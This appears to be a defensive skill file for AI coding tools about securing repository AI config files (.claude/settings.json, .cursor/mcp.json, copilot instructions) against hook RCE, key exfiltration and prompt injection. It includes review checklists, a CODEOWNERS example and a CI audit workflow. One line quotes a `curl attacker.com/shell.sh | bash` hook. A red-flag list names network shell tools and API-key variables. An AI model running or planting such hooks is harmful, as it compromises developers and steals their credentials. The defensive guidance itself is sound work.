---
description: >
  Governs the security of AI tool configuration files in repositories — .cursor/,
  .claude/, .github/copilot-instructions.md, and similar AI-specific config that
  tools trust implicitly. Prevents RCE, credential exfiltration, and prompt injection
  via repo config files that contributors can modify.
  Use when: (1) cloning or pulling a repository, (2) reviewing a PR that touches AI config files,
  (3) onboarding a new contributor, (4) auditing a project for AI tool attack surface,
  (5) setting up a new project with AI tooling.
globs: ["**/.cursor/**", "**/.claude/**", "**/.github/copilot-instructions.md", "**/.github/copilot*", "**/.continue/**", "**/.aider*"]
alwaysApply: false
tags: [product]
---

# AI Project Config Security

## Purpose

AI development tools (Cursor, Claude Code, GitHub Copilot, Continue, Aider) read configuration files from the repositories you work in. These files control tool behaviour, register extensions, define automation triggers, and can execute arbitrary code. Any contributor with write access to the repo can modify them. This skill ensures those files are reviewed, locked down, and monitored.

## Why This Matters

In early 2026, Check Point Research disclosed two CVEs that demonstrate this attack class:

**CVE-2025-59536 — Claude Code Hooks RCE**
Claude Code's `.claude/settings.json` supports a "Hooks" feature: shell commands that run automatically on events (e.g., pre-tool-use, post-tool-use, notification). A contributor adds a hook that runs `curl attacker.com/shell.sh | bash` on every tool invocation. You pull the code. Claude Code runs the hook. You're compromised.

**CVE-2026-21852 — Claude Code API Key Exfiltration**
Same `.claude/settings.json` — a malicious hook reads `ANTHROPIC_API_KEY` from the environment and exfiltrates it via HTTP. The hook runs in your shell context with access to all your environment variables.

**For non-technical founders:** These config files are like `.bashrc` for your AI tools — they run code automatically, they have access to your secrets, and anyone who can push to your repo can change them. You would never let a stranger edit your `.bashrc`. Apply the same standard here.

## Activation

This skill activates when you mention:
- "AI config", "cursor config", "claude config", "copilot config"
- ".cursor/mcp.json", ".claude/settings.json", "copilot-instructions"
- "AI tool security", "repo config attack"
- "hooks", "automations", "MCP server"
- "clone repo", "pull request review", "new contributor"

## The Attack Surface

| Config File | Tool | Risk | What It Can Do |
|---|---|---|---|
| `.cursor/mcp.json` | Cursor | MCP servers run with full system access | Execute code, read files, exfiltrate data |
| `.cursor/rules/` | Cursor | Rules files can inject prompts | Manipulate AI behaviour, bypass safety checks |
| `.cursor/automations/` | Cursor | Event-triggered agents | Run on PR open, Slack message, schedule — unattended |
| `.claude/settings.json` | Claude Code | Hooks execute shell commands on events | RCE, credential theft, data exfiltration |
| `.claude/CLAUDE.md` | Claude Code | Project instructions | Prompt injection, behaviour manipulation |
| `.github/copilot-instructions.md` | GitHub Copilot | Custom instructions | Prompt injection into suggestions |
| `.continue/config.json` | Continue | MCP-like server registration | Code execution via extensions |
| `.aider.conf.yml` | Aider | Model and behaviour config | Can redirect to attacker-controlled API endpoints |

## Golden Rules

1. **Treat AI config files as executable code.** Review them with the same scrutiny as shell scripts.
2. **Never auto-approve AI config changes from PRs.** Always manual review.
3. **Lock AI config directories with CODEOWNERS.** Require explicit approval from security-aware reviewers.
4. **Diff AI configs on every pull.** Don't trust that nothing changed.
5. **Audit AI configs when onboarding contributors.** New write access = new risk surface.

## Setup Checklist (New Project)

When setting up a new project with AI tooling:

```
□ Create CODEOWNERS entry for all AI config paths
□ Add AI config files to your PR review checklist
□ Document which AI config files exist and what they do
□ Set up git hooks or CI checks to flag AI config changes
□ Ensure .gitignore excludes local-only AI configs (user preferences)
□ Review any AI configs that came with the template/boilerplate
```

### CODEOWNERS Example

```
# AI tool configurations — require security review
.cursor/ @security-team
.claude/ @security-team
.github/copilot-instructions.md @security-team
.continue/ @security-team
.aider* @security-team
```

## Review Protocol

### On Every Pull/Clone

Before opening a project in any AI tool:

```
□ git diff HEAD@{1} -- .cursor/ .claude/ .github/copilot* .continue/ .aider*
□ Review any new or modified files manually
□ Check for shell commands, URLs, or encoded payloads
□ Verify MCP server URLs point to known, trusted services
□ Check for hooks that execute on events (pre-tool-use, post-tool-use, etc.)
```

### On Every PR That Touches AI Config

```
□ Examine exact changes — what was added, modified, or removed?
□ Verify the author had a legitimate reason for the change
□ Check for obfuscated content (base64, hex encoding, URL-encoded strings)
□ Test in an isolated environment before approving
□ Confirm no new shell commands or external URLs were added
□ Check that no automation triggers were added or modified
```

### On Contributor Onboarding/Offboarding

```
□ Review all AI config files for any changes since last audit
□ Rotate any secrets that AI tools had access to (if offboarding)
□ Verify CODEOWNERS still reflects current team structure
□ Brief new contributors on AI config review requirements
```

## Red Flags

Reject or investigate immediately if you see:

- **Shell commands in config files** — `bash`, `sh`, `curl`, `wget`, `nc`, `python -c`
- **External URLs** — especially in hooks, MCP servers, or API endpoints you don't recognise
- **Base64 or hex encoded strings** — obfuscation is never innocent in config files
- **Environment variable access** — `$ANTHROPIC_API_KEY`, `$OPENAI_API_KEY`, `process.env`
- **Network calls** — any config that phones home to an external service
- **Wildcard file access** — MCP servers or hooks that read `/**` or `~/**`
- **New automation triggers** — especially ones that fire on external events (webhooks, PRs)

## CI/CD Integration

Add a check to your CI pipeline that flags AI config changes:

```yaml
# .github/workflows/ai-config-audit.yml
name: AI Config Change Audit
on:
  pull_request:
    paths:
      - '.cursor/**'
      - '.claude/**'
      - '.github/copilot-instructions.md'
      - '.continue/**'
      - '.aider*'

jobs:
  audit:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Flag AI config changes
        run: |
          echo "⚠️ AI TOOL CONFIGURATION CHANGED"
          echo "These files affect AI tool behaviour and can execute code."
          echo "Manual security review required before merge."
          echo ""
          git diff origin/main --name-only -- .cursor/ .claude/ .github/copilot* .continue/ .aider*
```

## Relationship to Other Skills

- **MCP Security** — covers MCP-specific risks in depth (MCPoison, server vetting). This skill covers the broader config file attack surface.
- **Cursor Automations Governance** — covers automation-specific risks. This skill covers the config files that define those automations.
- **Secrets Management** — covers credential handling. This skill covers how AI configs can exfiltrate those credentials.
- **Pre-Release Checklist** — should include AI config audit as a gate item.

## Quick Reference Card

```
┌─────────────────────────────────────────────────┐
│           AI CONFIG SECURITY CHECKLIST           │
├─────────────────────────────────────────────────┤
│                                                 │
│  ON CLONE/PULL:                                 │
│  □ Diff AI config files before opening in IDE   │
│  □ Check for shell commands and external URLs   │
│                                                 │
│  ON PR REVIEW:                                  │
│  □ Examine AI config changes line by line       │
│  □ Verify author's reason for the change        │
│  □ Test in isolation before approving           │
│                                                 │
│  ON SETUP:                                      │
│  □ Add CODEOWNERS for all AI config paths       │
│  □ Add CI check for AI config changes           │
│  □ Document which AI configs exist and why      │
│                                                 │
│  RED FLAGS (REJECT IMMEDIATELY):                │
│  ✗ Shell commands in config files               │
│  ✗ Unknown external URLs                        │
│  ✗ Base64/hex encoded content                   │
│  ✗ Environment variable access                  │
│                                                 │
└─────────────────────────────────────────────────┘
```